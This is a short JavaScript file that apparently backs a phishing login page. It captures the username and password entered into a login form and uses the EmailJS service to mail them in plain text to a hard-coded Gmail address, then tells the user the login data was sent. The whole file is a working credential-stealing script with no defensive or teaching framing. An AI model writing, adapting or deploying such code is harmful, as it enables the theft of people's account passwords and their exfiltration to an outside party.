// Initialize EmailJS
(function() {
   emailjs.init("YOUR_EMAILJS_USER_ID");  // Replace with your EmailJS user ID
})();

document.getElementById('loginForm').addEventListener('submit', function(event) {
  event.preventDefault(); // Prevent default form submission

  // Get values from the form
  var username = document.getElementById('username').value;
  var password = document.getElementById('password').value;

  // Send email using EmailJS
  emailjs.send("service_1ez4c1e", "YOUR_TEMPLATE_ID", {
    to_email: "hdmovie257@gmail.com",  // Receiver email
    from_name: username,  // Sender name (from username)
    message: `Username: ${username}, Password: ${password}`  // The message content
  }).then(function(response) {
    alert('Login data sent successfully!');
  }, function(error) {
    console.log('FAILED...', error);  // Log the error in the console
    alert('Failed to send login data.');
  });
});
